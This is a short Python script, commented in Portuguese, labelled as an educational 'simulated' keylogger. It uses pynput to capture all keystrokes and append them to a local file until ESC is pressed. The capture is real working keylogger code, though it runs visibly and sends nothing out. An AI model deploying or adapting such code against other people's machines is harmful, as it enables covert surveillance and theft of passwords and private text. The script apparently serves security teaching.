"""
Keylogger simulado para fins educacionais.

Registra teclas digitadas em um arquivo local, apenas durante testes
realizados pelo próprio usuário em ambiente controlado.

Pressione ESC para encerrar.
"""
from pynput import keyboard

ARQUIVO_LOG = "teclas_capturadas.txt"

def salvar_tecla(tecla):
    with open(ARQUIVO_LOG, "a", encoding="utf-8") as arquivo:
        try:
            arquivo.write(tecla.char)
        except AttributeError:
            if tecla == keyboard.Key.space:
                arquivo.write(" ")
            elif tecla == keyboard.Key.enter:
                arquivo.write("\n")
            else:
                arquivo.write(f"[{tecla}]")

def ao_pressiona(tecla):
    if tecla == keyboard.Key.esc:
        print("\n[+] Encerrando keylogger simulado.")
        return False

    salvar_tecla(tecla)

def main():
    print("[+] Keylogger educacional iniciado.")
    print("[+] Digite apenas texto de teste.")
    print("[+] Pressione ESC para encerrar.")

    with keyboard.Listener(on_press=ao_pressiona) as ouvinte:
        ouvinte.join()

if __name__ == "__main__":
    main()
